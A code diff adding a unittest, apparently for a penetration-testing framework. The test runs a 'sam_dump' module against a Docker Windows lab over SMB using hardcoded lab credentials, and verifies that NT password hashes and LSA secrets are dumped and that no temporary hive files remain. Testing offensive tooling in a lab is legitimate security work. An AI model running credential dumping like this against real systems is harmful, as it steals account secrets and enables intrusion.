@@ -1053,6 +1053,83 @@ class TestAdProbeWindowsLab(unittest.TestCase):
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
 @unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestSamDumpLab(unittest.TestCase):
+    """sam_dump against the windows lab: real NT hashes (labadmin's hash
+    verified against MD4), LSA secrets, remote cleanup verified."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("windows")
+        deadline = time.time() + 300
+        while time.time() < deadline:
+            try:
+                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
+                conn.login("labadmin", "Labpass2024!")
+                conn.close()
+                break
+            except Exception:
+                time.sleep(5)
+        else:
+            cls.manager.down("windows")
+            raise RuntimeError("windows lab guest SMB not up within 300s")
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("windows")
+
+    def test_sam_and_lsa_dump(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/sam_dump",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 1445",
+                    "set USERNAME labadmin",
+                    "set PASSWORD Labpass2024!",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            # the hashes are REAL — labadmin's NT hash must match MD4
+            from Cryptodome.Hash import MD4
+            h = MD4.new()
+            h.update("Labpass2024!".encode("utf-16-le"))
+            self.assertIn(h.hexdigest(), out)
+            self.assertIn("labadmin:1000:", out)
+            self.assertIn("Administrator:500:", out)
+            hashes = console.store.loot("hash")
+            self.assertEqual(len(hashes), 5)
+            # LSA: dockur's autologon password lands in the secrets
+            self.assertIn("Labpass2024!", out)
+            lsa = console.store.loot("lsa")
+            self.assertEqual(len(lsa), 1)
+            # nothing left behind in C:\Windows\Temp
+            from impacket.smbconnection import SMBConnection
+            conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
+            conn.login("labadmin", "Labpass2024!")
+            try:
+                names = {e.get_longname()
+                         for e in conn.listPath("ADMIN$", r"Temp\fz_*")}
+            except Exception:
+                names = set()  # no match = nothing left behind
+            conn.close()
+            self.assertFalse(any(n.endswith(".tmp") for n in names),
+                             f"hives left behind: {names}")
+        finally:
+            console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
 class TestSmbExecWindowsLab(unittest.TestCase):
     """smb_exec against the windows lab: SYSTEM command execution through
     a transient SCMR service, output read back over ADMIN$."""
